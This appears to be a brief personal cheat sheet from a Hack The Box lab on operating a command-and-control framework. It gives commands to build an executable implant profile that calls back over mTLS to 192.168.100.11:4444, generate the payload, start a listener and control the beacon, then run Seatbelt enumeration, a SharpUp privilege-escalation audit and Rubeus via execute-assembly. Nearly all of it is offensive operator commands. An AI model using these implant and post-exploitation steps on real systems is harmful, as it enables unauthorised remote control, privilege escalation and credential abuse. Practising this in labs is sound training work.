#c2 

create a profile:
```bash
profiles new -e -f exe --mtls "mtls://192.168.100.11:4444"
```

create a payload with this profile:
```bash
profiles generate mtls
```

setting up a listener:
```bash
mtls
```

to use the beacon:
```bash
use <ID OF THE BEACON>
```

---

```bash
# eunumeration using seatbelt:
seatbelt -- -group=all

# tool like powerup
sharpup -- audit

# running rubues
execute-assembly /home/htb-ac590/Rubeus.exe createnetonly /program:C:\\windows\\system32\\notepad.exe
```